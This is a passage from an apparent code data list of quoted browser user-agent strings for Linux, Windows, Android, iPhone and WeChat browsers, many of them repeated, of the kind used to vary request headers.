     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
